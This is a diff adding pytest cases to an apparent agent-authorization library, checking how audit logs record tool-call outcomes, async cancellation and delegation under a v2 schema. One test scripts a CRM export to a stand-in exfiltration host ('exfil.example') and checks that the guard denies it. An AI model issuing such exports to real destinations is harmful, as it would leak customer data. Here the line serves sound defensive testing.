@@ -40,6 +40,7 @@ from attenu_guard import (  # noqa: E402
     Guard,
     RowLimit,
 )
+from attenu_guard.reasons import BodyState, Capture  # noqa: E402
 
 # --------------------------------------------------------------------------
 # Load the example adapter by path. It deliberately lives under examples/ (it
@@ -497,7 +498,7 @@ def test_default_subagent_authority_mints_children_for_undeclared_subagents(side
     from types import SimpleNamespace
     req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher",
                                                                 "description": "look things up"}})
-    gate = guarded._gate(req)
+    gate = guarded._gate(req, capture=dg_langgraph.Capture.WRAPPER_SYNC)
     assert gate.denial is None and gate.child is not None
     assert gate.child.agent_id == "researcher" and gate.child.is_narrower_than(root)
     spawn = [e for e in root.audit_log() if e["event"] == "spawn"][-1]
@@ -528,3 +529,200 @@ def test_delegation_lifecycle_end_is_recorded_when_the_task_tool_returns(side_ef
     assert child.is_complete
     dones = [e for e in root.audit_log() if e["event"] == "done"]
     assert len(dones) == 1 and dones[0]["agent"] == "researcher" and dones[0]["node"] == child.node_id
+
+
+# ==========================================================================
+# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
+# GuardedDelegation calls the tool body itself (handler(request)), exactly
+# like adapters/langgraph.py's reference wiring, so WRAPPER_SYNC/WRAPPER_ASYNC
+# is a genuine observation -- no cross-hook honesty caveat is needed.
+# ==========================================================================
+def _fresh_chain_v2():
+    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
+    summarizer = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize Q3 pipeline")
+    return root, summarizer
+
+
+def test_v2_allowed_call_records_a_returned_outcome(side_effects):
+    crm_query, crm_export, send_mail = _make_tools(side_effects)
+    root, summarizer = _fresh_chain_v2()
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+
+    model = ScriptedToolModel(responses=[
+        _call("crm_query", {"rows": 10}, "c1"),
+        AIMessage(content="done"),
+    ])
+    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
+    app.invoke({"messages": [("user", "go")]})
+
+    entries = list(root.audit_log())
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
+    assert allow["capture"] == Capture.WRAPPER_SYNC
+    assert allow["adapter"]["module"] == "attenu_guard.adapters.langchain"
+    assert outcome["body_state"] == BodyState.RETURNED
+    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
+    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
+
+
+def test_v2_async_allowed_call_records_a_returned_outcome_wrapper_async(side_effects):
+    import asyncio
+
+    crm_query, crm_export, send_mail = _make_tools(side_effects)
+    root, summarizer = _fresh_chain_v2()
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+
+    class S(TypedDict):
+        messages: Annotated[list[AnyMessage], add_messages]
+
+    model = ScriptedToolModel(responses=[
+        _call("crm_query", {"rows": 10}, "c1"),
+        AIMessage(content="done"),
+    ])
+
+    async def call_model(state: S) -> dict:
+        return {"messages": [await model.ainvoke(state["messages"])]}
+
+    graph = StateGraph(S)
+    graph.add_node("model", call_model)
+    graph.add_node("tools", ToolNode(
+        [crm_query, crm_export, send_mail],
+        wrap_tool_call=guarded.wrap_tool_call,
+        awrap_tool_call=guarded.awrap_tool_call,
+    ))
+    graph.add_edge(START, "model")
+    graph.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
+    graph.add_edge("tools", "model")
+    app = graph.compile()
+
+    asyncio.run(app.ainvoke({"messages": [("user", "go")]}))
+
+    entries = list(root.audit_log())
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
+    assert allow["capture"] == Capture.WRAPPER_ASYNC
+    assert outcome["body_state"] == BodyState.RETURNED
+
+
+def test_v2_a_tool_that_raises_records_a_raised_outcome(side_effects):
+    root, summarizer = _fresh_chain_v2()
+
+    @tool
+    def crm_query(rows: int) -> str:
+        """Raises instead of returning."""
+        raise ValueError("boom")
+
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
+    app = _build_tool_graph(model, guarded, [crm_query])
+    with pytest.raises(ValueError):
+        app.invoke({"messages": [("user", "go")]})
+
+    entries = list(root.audit_log())
+    outcome = next(e for e in entries if e["event"] == "outcome")
+    assert outcome["body_state"] == BodyState.RAISED
+    assert outcome["error_code"] == "ValueError"
+
+
+def test_v2_denied_call_never_records_an_outcome(side_effects):
+    crm_query, crm_export, send_mail = _make_tools(side_effects)
+    root, summarizer = _fresh_chain_v2()
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    model = ScriptedToolModel(responses=[
+        _call("crm_export", {"destination": "https://exfil.example"}, "c1"),
+        AIMessage(content="x"),
+    ])
+    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
+    app.invoke({"messages": [("user", "go")]})
+
+    assert side_effects == []
+    entries = list(root.audit_log())
+    assert [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export"] == []
+    assert [e for e in entries if e["event"] == "outcome"] == []
+
+
+def test_v1_chain_gets_no_capture_adapter_or_outcome(side_effects):
+    """schema_version=1 (the default): byte-and-type identical to every release before 0.9.0."""
+    crm_query, crm_export, send_mail = _make_tools(side_effects)
+    root, summarizer = _fresh_chain()   # v1, unchanged default
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
+    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
+    app.invoke({"messages": [("user", "go")]})
+
+    entries = list(root.audit_log())
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
+    assert [e for e in entries if e["event"] == "outcome"] == []
+
+
+def test_v2_delegation_call_never_gets_capture_or_an_outcome(side_effects):
+    """The `task` tool mints via guard.delegate(), never calls guard.check() -- there is no
+    Decision/call_id for it to bind an outcome to, on any schema version."""
+    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample", schema_version=2)
+    guarded = GuardedDelegation(root, tools={}, subagents={},
+                                default_policy=lambda name: ToolPolicy(f"observe.{name}"),
+                                default_subagent_authority=lambda name: Authority({"observe.*"}, [], ttl=None))
+    from types import SimpleNamespace
+    req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher", "description": "x"}})
+    out = guarded.wrap_tool_call(req, lambda r: "child ran")
+    assert out == "child ran"
+    entries = list(root.audit_log())
+    assert [e for e in entries if e["event"] in ("allow", "outcome")] == []
+
+
+def test_v2_async_cancelled_call_records_abandoned_and_still_propagates(side_effects):
+    import asyncio
+
+    crm_query, crm_export, send_mail = _make_tools(side_effects)
+    root, summarizer = _fresh_chain_v2()
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+
+    async def hangs(request):
+        await asyncio.sleep(3600)
+
+    from types import SimpleNamespace
+    req = SimpleNamespace(tool_call={"name": "crm_query", "args": {"rows": 10}, "id": "c1"})
+
+    async def scenario():
+        task = asyncio.ensure_future(guarded.awrap_tool_call(req, hangs))
+        await asyncio.sleep(0)   # let it reach the awaited sleep
+        task.cancel()
+        with pytest.raises(asyncio.CancelledError):
+            await task
+
+    asyncio.run(scenario())
+    entries = list(root.audit_log())
+    outcome = next(e for e in entries if e["event"] == "outcome")
+    assert outcome["body_state"] == BodyState.ABANDONED
+    assert "error_code" not in outcome
+
+
+def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
+    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
+    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
+    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
+    class AliasingList(list):
+        def __deepcopy__(self, memo):
+            return self
+
+    live = {"x": AliasingList([1])}
+    snapshot = dg_langgraph._snapshot_params(live)
+
+    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
+    live["x"].append(2)
+    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"
+
+
+def test_v2_complete_finalizes_and_verifier_reports_the_tool_call_observed():
+    """After a real graph run, the summarizer's own Guard must be able to complete() -- proving
+    every allowed, v2, WRAPPER-captured call genuinely got its outcome bound, not merely that
+    the graph didn't crash."""
+    crm_query, crm_export, send_mail = _make_tools([])
+    root, summarizer = _fresh_chain_v2()
+    guarded = GuardedDelegation(summarizer, tools=POLICIES)
+    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
+    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
+    app.invoke({"messages": [("user", "go")]})
+
+    assert summarizer.complete()
